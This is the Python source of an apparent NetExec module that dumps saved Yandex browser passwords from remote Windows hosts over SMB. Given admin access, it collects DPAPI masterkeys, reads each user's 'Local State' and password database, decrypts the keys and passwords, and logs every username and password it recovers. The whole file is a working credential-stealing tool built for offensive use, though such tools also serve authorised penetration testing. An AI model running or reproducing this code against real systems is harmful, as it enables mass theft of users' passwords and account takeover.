import ntpath
from json import loads
from sqlite3 import connect
from base64 import b64decode
from tempfile import NamedTemporaryFile

from Crypto.Hash import SHA1
from Cryptodome.Cipher import AES
from dploot.lib.target import Target
from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, upgrade_to_dploot_connection


class NXCModule:
    """
    Yandex credentials dumper by @Moghees244
    Inspired by Soviet-Thief: https://github.com/LimerBoy/Soviet-Thief
    """

    name = "yandex"
    description = "Dump credentials stored in Yandex browser"
    supported_protocols = ["smb"]
    multiple_hosts = False

    def __init__(self):
        self.context = None
        self.module_options = None

        # Module related variables
        self.target = None
        self.masterkeys = None
        self.browser_path = "Users\\{}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data"
        self.local_state_file = "Local State"
        self.share = "C$"

    def options(self, context, module_options):
        """Module options get parsed here."""

    def get_users(self):
        """
        Retrieves a list of user profile directories from the 'Users' share
        on the target system.
        """
        # List of directory names that are not actual user profiles
        false_positives = (
            ".",
            "..",
            "desktop.ini",
            "Public",
            "Default",
            "Default User",
            "All Users",
        )
        # List all entries in the 'Users' directory
        users = []
        dirs = self.conn.listPath(shareName=self.share, path="Users\\*")
        # Filter out false positives and return valid user directories
        for d in dirs:
            if d.get_longname() not in false_positives and d.is_directory():
                username = d.get_longname()
                users.append(username)
        return users

    def get_key_from_local_state(self, context, state_data):
        """
        The function extracts and decrypts the AES key, which is used to
        decrypt local encryption key of yandex. It decodes the base64-encoded
        DPAPI-encrypted key found in the 'os_crypt' section of the provided JSON
        data. Then it decrypts the key using its corresponding masterkey.
        """
        # Base64 decode the encrypted key from the JSON data
        encrypted_key_blob = b64decode(loads(state_data)["os_crypt"]["encrypted_key"])

        # Validate the blob and find the corresponding masterkey
        if encrypted_key_blob[:5] == b"DPAPI":
            dpapi_blob = encrypted_key_blob[5:]
            masterkey = find_masterkey_for_blob(dpapi_blob, masterkeys=self.masterkeys)

            if masterkey:
                # Decrypt and return the AES key
                return decrypt_blob(blob_bytes=dpapi_blob, masterkey=masterkey)
            else:
                context.log.fail("No master key found to decrypting DPAPI blob.")
            return None

    def extract_enc_key(self, context, cursor, master_key):
        """
        The function extracts the local encryption key from the browser's SQLite
        metadata. It retrieves the GCM-encrypted key blob from the 'meta' table,
        locates the 'v10' prefix, and decrypts the AES key using the provided master
        key. This key will be used to decrypt user passwords from database.
        """
        # Query the metadata table to find the encrypted key blob
        cursor.execute("SELECT value FROM meta WHERE key = 'local_encryptor_data'")
        row = cursor.fetchone()
        if not row:
            context.log.fail("No 'local_encryptor_data' key found in meta table.")
            return None

        # Look for GCM-encrypted blob prefix
        blob = row[0]
        index = blob.find(b"v10")
        if index == -1:
            context.log.fail("'local_encryptor_data' blob invalid, missing v10 prefix.")
            return None

        # Extract the AES-GCM encrypted payload
        gcm_payload = blob[index + 3 : index + 3 + 96]
        nonce = gcm_payload[:12]
        ciphertext = gcm_payload[12:-16]
        tag = gcm_payload[-16:]

        # Decrypt the blob using AES-GCM with the given master key
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)

        # Check magic header to ensure blob is valid
        if int.from_bytes(decrypted[:4], "little") != 0x20120108:
            context.log.fail("Unable to decrypt 'local_encryptor_data' blob.")
            return None
        # Return the decrypted 32-byte key
        return decrypted[4:36]

    def decrypt_password(self, enc_key, blob, aad):
        """
        The function decrypts Yandex password blob using AES-GCM. Yandex store
        passwords using AES-GCM. This function splits the blob into nonce, ciphertext,
        and tag, then decrypts it using the provided AES key and associated data.
        """
        # Getting nonce, ciphertext and Authentication tag from blob
        nonce = blob[:12]
        ciphertext = blob[12:-16]
        tag = blob[-16:]

        # Initialize AES-GCM cipher with the provided key and nonce
        cipher = AES.new(enc_key, AES.MODE_GCM, nonce=nonce)
        # Set the AAD (Associated Authenticated Data) used during encryption
        cipher.update(aad)

        # Decrypt and verify authenticity; return decoded password
        return cipher.decrypt_and_verify(ciphertext, tag).decode()

    def get_passwords_for_user(self, context, winuser, profile_base, decrypted_key):
        """
        The function extracts saved passwords for a Yandex browser user profile by
        decrypting the browser's SQLite database. It looks through the user profiles
        in the given directory path, locates the Yandex password database, extracts the
        local encryption key, and decrypts the saved login credentials.
        """
        # List directories under the user's profile path
        dirs = self.conn.remote_list_dir(share=self.share, path=profile_base)

        for d in dirs:
            if d.get_longname().startswith("Profile") or d.get_longname() == "Default":
                profile_dir = d.get_longname()
                # Attempt to read the SQLite DB available in profile directory
                db_path = ntpath.join(profile_base, profile_dir, "Ya Passman Data")
                db_data = self.conn.readFile(self.share, db_path)

                if not db_data:
                    continue

                # Temporarily save the DB blob to a local file for SQLite access
                with NamedTemporaryFile() as fh:
                    fh.write(db_data)
                    fh.seek(0)

                    with connect(fh.name) as conn_sqlite:
                        # Extract AES encryption key for entries in this DB
                        cursor = conn_sqlite.cursor()
                        enc_key = self.extract_enc_key(context, cursor, decrypted_key)
                        if not enc_key:
                            continue
                        
                        # Fetch login entries from the 'logins' table
                        cursor.execute(
                            "SELECT origin_url, username_element, username_value, "
                            "password_element, password_value, signon_realm FROM logins"
                        )
                        for (
                            url,
                            username_element,
                            username,
                            password_element,
                            password,
                            signon_realm,
                        ) in cursor.fetchall():
                            if not password:
                                continue
                            
                            # Construct AAD (Additional Authenticated Data)
                            aad_string = f"{url}\0{username_element}\0{username}\0{password_element}\0{signon_realm}"
                            aad = SHA1.new(aad_string.encode()).digest()
                            # Decrypt the password
                            decrypted_pwd = self.decrypt_password(enc_key, password, aad)
                            # Log and store decrypted credentials in database
                            url = url + " -" if url else "-"
                            context.log.highlight(f"[{winuser}] {url} {username}:{decrypted_pwd}")
    
                            context.db.add_dpapi_secrets(
                                self.target, "YANDEX", winuser, username, decrypted_pwd, url
                            )

    def on_admin_login(self, context, connection):
        """
        Handler for administrator-level authenticated SMB connections. This function is
        called on each authenticated connection with administrative privileges. It loops
        through all user directories, attempts to locate and decrypt their Yandex browser's
        local state, and extracts stored credentials.
        """
        username = connection.username
        self.target = (
            connection.host
            if not connection.kerberos
            else connection.hostname + "." + connection.domain
        )

        # Create a DP-loot target object
        target = Target.create(
            domain=connection.domain,
            target=self.target,
            username=username,
            password=getattr(connection, "password", ""),
            lmhash=getattr(connection, "lmhash", ""),
            nthash=getattr(connection, "nthash", ""),
            do_kerberos=connection.kerberos,
            aesKey=connection.aesKey,
            no_pass=True,
            use_kcache=getattr(connection, "use_kcache", False),
        )

        # Upgrade the SMB connection to one compatible with DPLoot file operations
        self.conn = upgrade_to_dploot_connection(
            connection=connection.conn, target=target
        )
        if self.conn is None:
            context.log.fail("Could not upgrade connection.")
            return

        # Collect DPAPI master keys from the system
        self.masterkeys = collect_masterkeys_from_target(
            connection, target, self.conn, user=True
        )
        if len(self.masterkeys) == 0:
            context.log.fail("No master key found.")
            return

        context.log.display("Dumping Yandex credentials.")

        # Loop through each user's directory and dump their credentials
        for user in self.get_users():
            profile_base = self.browser_path.format(user)
            local_state_path = ntpath.join(profile_base, self.local_state_file)

            # Attempt to read the Local State file for the user
            local_state_data = self.conn.readFile(self.share, local_state_path)
            if not local_state_data:
                context.log.debug(f"Yandex browser local state is not available for {user}")
                continue

            # Decrypt the AES key used to encrypt passwords
            decrypted_key = self.get_key_from_local_state(
                state_data=local_state_data, context=context
            )
            if not decrypted_key:
                continue

            # Decrypt and dump stored passwords for this user
            self.get_passwords_for_user(context, user, profile_base, decrypted_key)

        context.log.success("Task Completed!")